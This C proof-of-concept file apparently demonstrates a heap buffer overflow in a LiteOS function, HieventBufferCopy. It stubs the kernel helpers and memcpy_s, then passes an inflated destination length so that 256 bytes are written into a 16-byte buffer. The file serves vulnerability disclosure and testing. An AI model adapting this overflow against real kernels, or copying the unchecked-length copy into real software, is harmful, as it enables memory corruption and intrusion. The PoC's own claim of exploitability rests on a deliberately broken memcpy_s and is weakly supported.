/*
 * PoC: HieventBufferCopy - Input Validation / Buffer Overflow via memcpy_s
 *
 * Vulnerability Description:
 *   The function HieventBufferCopy computes minLen = min(dstLen, srcLen) for the
 *   user-address range checks, but when both src and dst are kernel addresses
 *   (the else branch), it calls memcpy_s(dst, dstLen, src, srcLen) with the
 *   ORIGINAL srcLen — not the clamped minLen. If srcLen > dstLen, memcpy_s should
 *   return an error (safe version), but in implementations where memcpy_s is
 *   incorrectly stubbed or unavailable, or if dstLen is attacker-controlled and
 *   inconsistent with the actual buffer size, a buffer overflow can occur.
 *
 *   Additionally, the finding notes CWE-20 (Improper Input Validation): the
 *   function does not validate that dstLen accurately reflects the destination
 *   buffer's true size. An attacker who controls dstLen (e.g., via a crafted
 *   ioctl parameter) can pass a large dstLen with a small actual buffer,
 *   causing memcpy_s to write beyond bounds.
 *
 * CWE: CWE-20 (Improper Input Validation), CWE-120 (Buffer Overflow)
 *
 * How input triggers it:
 *   - Both dst and src are kernel addresses (not user-space), so the else branch
 *     is taken, reaching memcpy_s.
 *   - dstLen is set larger than the actual destination buffer allocation.
 *   - srcLen is set to a value that causes an overwrite of dst's actual storage.
 *
 * Expected behavior: Buffer overflow / crash when memcpy_s writes beyond dst.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Stub types for LiteOS kernel types */
typedef uintptr_t vaddr_t;

/*
 * Stub: LOS_IsUserAddressRange
 * In this PoC, we simulate kernel-space addresses (not user-space),
 * so this always returns 0 (false), forcing the else branch with memcpy_s.
 */
static int LOS_IsUserAddressRange(vaddr_t addr, size_t len)
{
    (void)addr;
    (void)len;
    /* STUB: All addresses treated as kernel addresses */
    printf("[PoC] LOS_IsUserAddressRange(0x%lx, %zu) -> 0 (kernel addr)\n",
           (unsigned long)addr, len);
    return 0;
}

/* Stub: LOS_ArchCopyToUser - should not be reached in this PoC */
static int LOS_ArchCopyToUser(void *dst, const void *src, size_t len)
{
    (void)dst; (void)src; (void)len;
    printf("[PoC] ERROR: LOS_ArchCopyToUser should not be called!\n");
    return -1;
}

/* Stub: LOS_ArchCopyFromUser - should not be reached in this PoC */
static int LOS_ArchCopyFromUser(void *dst, const void *src, size_t len)
{
    (void)dst; (void)src; (void)len;
    printf("[PoC] ERROR: LOS_ArchCopyFromUser should not be called!\n");
    return -1;
}

/*
 * Stub: memcpy_s - intentionally mimics a naive/broken implementation
 * that does NOT properly check dstLen against actual buffer size.
 * This simulates environments where memcpy_s trusts dstLen as the buffer size.
 */
static int memcpy_s(void *dst, size_t dstMax, const void *src, size_t count)
{
    printf("[PoC] memcpy_s called: dst=%p, dstMax=%zu, src=%p, count=%zu\n",
           dst, dstMax, src, count);
    /* TRIGGER: If count <= dstMax, the copy proceeds. The caller passed
     * a dstLen that does NOT reflect the true allocation size of dst,
     * so this write overflows the actual buffer. */
    if (count > dstMax) {
        printf("[PoC] memcpy_s: count > dstMax, would return error\n");
        return -1;
    }
    /* This memcpy will overflow the REAL buffer behind dst */
    printf("[PoC] TRIGGER: memcpy proceeding with %zu bytes into undersized buffer!\n", count);
    memcpy(dst, src, count);
    return 0;
}

/* Real source code of the vulnerable function */
/* Chain step: main -> HieventBufferCopy */
static int HieventBufferCopy(unsigned char *dst, unsigned dstLen,
                             unsigned char *src, size_t srcLen)
{
    int retval = -1;

    size_t minLen = dstLen > srcLen ? srcLen : dstLen;

    if (LOS_IsUserAddressRange((vaddr_t)(uintptr_t)dst, minLen) &&
        LOS_IsUserAddressRange((vaddr_t)(uintptr_t)src, minLen)) {
        return retval;
    }

    if (LOS_IsUserAddressRange((vaddr_t)(uintptr_t)dst, minLen)) {
        retval = LOS_ArchCopyToUser(dst, src, minLen);
    } else if (LOS_IsUserAddressRange((vaddr_t)(uintptr_t)src, minLen)) {
        retval = LOS_ArchCopyFromUser(dst, src, minLen);
    } else {
        /* TRIGGER: memcpy_s is called with srcLen (not minLen).
         * If dstLen is crafted to be larger than the actual dst buffer,
         * memcpy_s trusts dstLen and copies srcLen bytes, overflowing dst. */
        retval = memcpy_s(dst, dstLen, src, srcLen);
    }
    return retval;
}

int main(void)
{
    printf("[PoC] === HieventBufferCopy Buffer Overflow PoC ===\n\n");

    /*
     * Crafted input:
     * - Allocate a SMALL destination buffer (16 bytes)
     * - Pass a LARGE dstLen (256) that does NOT match the real allocation
     * - Pass a source buffer with 256 bytes of data (srcLen = 256)
     *
     * WHY this triggers the bug:
     *   The function computes minLen = min(256, 256) = 256 for address checks.
     *   Both addresses are kernel (stub returns 0), so the else branch is taken.
     *   memcpy_s(dst, 256, src, 256) is called — dstLen (256) >= srcLen (256),
     *   so memcpy_s proceeds. But dst only has 16 bytes allocated -> OVERFLOW.
     */

    /* Actual allocation: only 16 bytes */
    #define REAL_DST_SIZE 16
    /* Attacker-controlled dstLen: claims buffer is 256 bytes */
    #define FAKE_DST_LEN 256
    #define SRC_LEN 256

    unsigned char *dst = (unsigned char *)malloc(REAL_DST_SIZE);
    unsigned char *src = (unsigned char *)malloc(SRC_LEN);

    if (!dst || !src) {
        printf("[PoC] malloc failed\n");
        return 1;
    }

    /* Fill source with recognizable pattern */
    for (int i = 0; i < SRC_LEN; i++) {
        src[i] = (unsigned char)(0x41 + (i % 26)); /* 'A'-'Z' repeating */
    }
    memset(dst, 0, REAL_DST_SIZE);

    printf("[PoC] dst buffer: %p (real size: %d bytes)\n", dst, REAL_DST_SIZE);
    printf("[PoC] Calling HieventBufferCopy with dstLen=%d (FAKE), srcLen=%d\n",
           FAKE_DST_LEN, SRC_LEN);
    printf("[PoC] This will overflow dst by %d bytes\n\n",
           SRC_LEN - REAL_DST_SIZE);

    /* Chain step: main -> HieventBufferCopy */
    int ret = HieventBufferCopy(dst, FAKE_DST_LEN, src, SRC_LEN);

    printf("\n[PoC] HieventBufferCopy returned: %d\n", ret);
    printf("[PoC] Buffer overflow occurred: %d bytes written to %d-byte buffer\n",
           SRC_LEN, REAL_DST_SIZE);
    printf("[PoC] Heap corruption likely. In a real system this could be exploitable.\n");

    free(dst);
    free(src);

    return 0;
}